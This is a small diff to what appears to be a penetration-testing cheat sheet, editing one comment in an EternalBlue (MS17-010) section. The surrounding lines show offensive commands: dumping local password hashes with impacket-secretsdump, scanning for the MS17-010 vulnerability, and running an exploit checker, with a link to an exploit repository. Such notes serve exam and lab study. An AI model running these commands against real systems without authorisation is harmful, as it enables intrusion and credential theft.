@@ -170,7 +170,7 @@ impacket-secretsdump LOCAL -sam sam -system system -security security
 nmap --script smb-vuln-ms17-010 -p 445 $IP
 nxc smb $IP -u '' -p '' -M ms17-010
 
-# Exploit — OSCP: manual PoC preferred
+# Exploit — manual PoC preferred
 # https://github.com/3ndG4me/AutoBlue-MS17-010
 python3 eternal_checker.py $IP
 # Generate shellcode:
